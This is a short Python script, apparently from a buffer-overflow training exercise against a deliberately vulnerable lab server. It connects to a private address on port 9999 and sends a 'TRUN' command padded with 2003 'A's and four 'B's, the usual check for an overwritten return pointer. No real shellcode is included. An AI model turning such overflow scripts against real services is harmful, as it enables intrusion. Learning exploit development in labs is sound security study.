#!/usr/bin/python
import sys, socket
from time import sleep
buffer = "A" * 100

shellcode = "A"*2003 + "B"*4
try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("192.168.31.1",9999))

	s.send('TRUN /.:/'+ shellcode)
	s.close()
	sleep(1)
	buffer = buffer + "A"*100
except:
	print("Fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()